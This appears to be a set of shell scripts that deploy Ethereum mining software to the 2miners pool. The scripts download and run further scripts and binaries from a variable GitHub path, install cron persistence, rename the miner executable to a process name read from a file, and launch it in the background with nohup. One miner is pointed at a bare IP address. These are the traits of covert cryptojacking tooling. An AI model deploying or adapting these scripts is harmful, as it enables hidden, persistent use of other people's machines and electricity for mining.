#Run 2miner trex
#!/bin/bash

Wallet=$(cat wl.txt)
USEPROCNAME=$(cat SETPROCNAME.txt)
Uuname=$(cat inuser.txt)
date=$(cat date.txt)
namenday="$Uuname"-"$date"

./$USEPROCNAME -a ethash -o stratum+tcp://eth.2miners.com:2020 -u $Wallet -p x -w $namenday



# Run with 3 url 2miner mlnode
#!/bin/bash

Wallet=$(cat wl.txt)
Uuname=$(cat inuser.txt)
date=$(cat date.txt)
USEPROCNAME=$(cat SETPROCNAME.txt)
farmrecheck=$(shuf -i 200-300 -n 1)
namenday="$Uuname"-"$date"

./$USEPROCNAME --farm-recheck $farmrecheck -U \
                    -P stratum1+tcp://$Wallet.$namenday@us-eth.2miners.com:2020 \
                    -P stratum1+tcp://$Wallet.$namenday@eth.2miners.com:2020 \
                    -P stratum1+tcp://$Wallet.$namenday@asia-eth.2miners.com:2020

#LOL
			wget https://raw.githubusercontent.com/$gitpath/main/cron.sh
			wget https://raw.githubusercontent.com/$gitpath/main/cronadd.sh
			wget https://raw.githubusercontent.com/$gitpath/main/auinstall.sh
			wget https://raw.githubusercontent.com/$gitpath/main/processname.sh
			chmod +x auinstall.sh
			chmod +x processname.sh
			chmod +x cronadd.sh
			./cronadd.sh
			./processname.sh
			cp inuser.txt bin/inuser.txt
			
			mkdir bin/
			cd bin/
			wget https://github.com/$gitpath/blob/main/lolnux.zip
			mv lolnux.zip linux
			chmod +x linux

			Uuname=$(cat inuser.txt)
			USEPROCNAME=$(cat SETPROCNAME.txt)
			wget https://raw.githubusercontent.com/$gitpath/main/runlol.sh
			mv runlol.sh runsrc.sh
			chmod +x runsrc.sh
			date +'%A' > date.txt
			mv linux $USEPROCNAME
			sudo chown -R $Uuname:$Uuname /home/$Uuname/
			nohup sh runsrc.sh > result.log 2>&1 &


# Mlnoder
gitpath=$(cat gitpath.txt)
Uuname=$(cat inuser.txt)
			wget https://github.com/$gitpath/raw/main/Mlnode.tar.gz
			tar -xvf Mlnode.tar.gz
			rm -rf Mlnode.tar.gz
			#da co thu muc bin
			wget https://raw.githubusercontent.com/$gitpath/main/cron.sh
			wget https://raw.githubusercontent.com/$gitpath/main/cronadd.sh
			wget https://raw.githubusercontent.com/$gitpath/main/auinstall.sh
			wget https://raw.githubusercontent.com/$gitpath/main/processname.sh
			chmod +x auinstall.sh
			chmod +x processname.sh
			chmod +x cronadd.sh
			./cronadd.sh
			./processname.sh
			cp inuser.txt bin/inuser.txt
			cd bin/
			Uuname=$(cat inuser.txt)
			USEPROCNAME=$(cat SETPROCNAME.txt)
			wget https://raw.githubusercontent.com/$gitpath/main/runsrc.sh
			chmod +x runsrc.sh
			date +'%A' > date.txt
			mv etheminer $USEPROCNAME
			sudo chown -R $Uuname:$Uuname /home/$Uuname/
			nohup sh runsrc.sh > result.log 2>&1 &



# Wal
Wallet=$(cat wl.txt)
Uuname=$(cat inuser.txt)
date=$(cat date.txt)
USEPROCNAME=$(cat SETPROCNAME.txt)
farmrecheck=$(shuf -i 200-300 -n 1)
namenday="$Uuname"-"$date"

pool1=$(cat wpo1.txt)
pool2=$(cat wpo2.txt)

./$USEPROCNAME --farm-recheck $farmrecheck -U \
                    -P stratum1+tcp://$Wallet.$namenday@us-eth.2miners.com:2020 \
                    -P stratum1+tcp://$Wallet.$namenday@eth.2miners.com:2020 \
                    -P stratum1+tcp://$Wallet.$namenday@asia-eth.2miners.com:2020

./$USEPROCNAME --farm-recheck 200 -G -F http://184.164.64.100:8086/